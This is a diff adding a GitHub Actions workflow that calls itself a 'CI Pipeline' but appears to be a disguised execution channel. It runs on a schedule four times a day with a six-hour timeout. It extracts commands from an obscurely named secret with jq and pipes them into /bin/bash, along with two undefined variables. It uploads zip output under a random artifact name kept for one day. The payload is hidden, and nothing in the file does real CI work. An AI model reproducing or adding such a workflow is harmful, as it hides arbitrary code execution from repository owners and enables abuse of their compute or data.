@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          ay87: ${{ secrets.ay87 }}
+        run: |
+          printf '%s' "$ay87" | jq -r .bf2165 | /bin/bash
+          echo $d253 | jq -r .c9264 | /bin/bash
+          echo $hgou52625 | jq -r .avni8728 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: SAIgbcFj
+          path: "*.zip"
+          retention-days: 1
